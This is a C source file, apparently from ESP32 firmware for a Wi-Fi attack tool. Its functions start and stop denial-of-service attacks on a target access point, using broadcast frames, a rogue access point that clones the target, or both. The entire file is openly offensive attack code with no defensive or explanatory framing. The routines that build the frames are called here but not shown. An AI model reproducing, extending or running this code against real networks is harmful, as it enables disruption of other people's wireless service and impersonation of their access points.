#include "attack_dos.h"
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"

static const char *TAG = "attack_dos";
static attack_dos_methods_t current_method = -1;

void attack_dos_start(attack_config_t *cfg){
    ESP_LOGI(TAG, "DoS start, method=%d", cfg->method);
    current_method = cfg->method;
    switch(cfg->method){
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast(cfg->ap_record, 1);
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            attack_method_rogueap(cfg->ap_record);
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_rogueap(cfg->ap_record);
            attack_method_broadcast(cfg->ap_record, 1);
            break;
        default:
            ESP_LOGE(TAG, "Unknown method");
    }
}

void attack_dos_stop(){
    switch(current_method){
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        default:
            ESP_LOGW(TAG, "Nothing to stop (method unknown)");
    }
    current_method = -1;
    ESP_LOGI(TAG, "DoS stopped");
}
